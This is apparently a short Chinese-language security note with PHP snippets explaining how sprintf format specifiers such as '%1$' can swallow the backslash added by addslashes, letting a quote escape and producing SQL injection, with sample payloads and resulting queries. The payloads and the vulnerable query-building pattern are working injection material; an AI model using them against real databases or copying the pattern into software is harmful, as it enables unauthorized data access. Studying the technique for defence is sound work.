<?php

$input = addslashes("%1$' and 1=1#");
$b = sprintf("AND b='%s'", $input);
...
$sql = sprintf("SELECT * FROM t WHERE a='%s' $b", 'admin');
echo $sql;
//a ='admin' AND b='%1$\''and 1=1#
// 复制代码
// 通过fuzz得知，在php的格式化字符串中，%后的一个字符(除了'%')会被当作字符类型，而被吃掉，单引号'，斜杠\也不例外。

// 如果能提前将%' and 1=1#拼接入sql语句，若存在SQLi过滤，单引号会被转义成\'

// select * from user where username = '%\' and 1=1#';
// 然后这句sql语句如果继续进入格式化字符串，\会被%吃掉，'成功逃逸

// sprintf函数
// 把百分号（%）符号替换成一个作为参数进行传递的变量：

<?php
$number = 2;
$str = "Shanghai";
$txt = sprintf("There are %u million cars in %s.",$number,$str);
echo $txt;
?>
There are 2 million cars in Shanghai.
<?php
$sql = "select * from user where username = '%\' and 1=1#';";
$args = "admin";
echo sprintf( $sql, $args ) ;
//result: select * from user where username = '' and 1=1#'
?>
还可以使用%1$吃掉后面的斜杠，而不引起报错
<?php
$sql = "select * from user where username = '%1$\' and 1=1#' and password='%s';";
$args = "admin";
echo sprintf( $sql, $args);
//result: select * from user where username = '' and 1=1#' and password='admin';
?>
// %b - 二进制数
// %c - 依照 ASCII 值的字符
// %d - 带符号十进制数
// %e - 可续计数法（比如 1.5e+3

https://paper.seebug.org/386/